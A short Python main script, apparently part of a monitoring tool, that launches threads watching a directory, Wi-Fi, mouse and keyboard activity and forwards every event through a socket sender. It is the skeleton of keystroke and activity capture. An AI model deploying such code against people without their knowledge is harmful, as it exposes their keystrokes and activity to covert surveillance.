from observers.file_observer import monitor_directory
from observers.wifi_observer import observe_wifi
from observers.mouse_obsever import start_mouse_observer
from observers.keyboard_observer import start_keyboard_observer
from controllers.socket_controller import send_message
import threading
import time

def on_event_hit(message):
    send_message(message)

def run_monitor_directory():
    monitor_directory(on_event_hit)

def run_observe_wifi():
    observe_wifi(on_event_hit)

def run_observe_mouse():
    start_mouse_observer(on_event_hit)

def run_observe_keyboard():
    start_keyboard_observer(on_event_hit)

if __name__ == "__main__":
    # Create threads for monitoring directory and observing Wi-Fi
    directory_thread = threading.Thread(target=run_monitor_directory, daemon=True)
    wifi_thread = threading.Thread(target=run_observe_wifi, daemon=True)
    mouse_thread = threading.Thread(target=run_observe_mouse, daemon=True)
    keyboard_thread = threading.Thread(target=run_observe_keyboard, daemon=True)

    # Start the threads
    directory_thread.start()
    wifi_thread.start()
    mouse_thread.start()
    keyboard_thread.start()

    print("Monitoring directory and observing Wi-Fi started.")

    # Keep the main thread alive to allow the daemon threads to run
    try:
        while True:
            time.sleep(1)
            pass  # Or use time.sleep(1) for less CPU usage
    except KeyboardInterrupt:
        print("Exiting...")
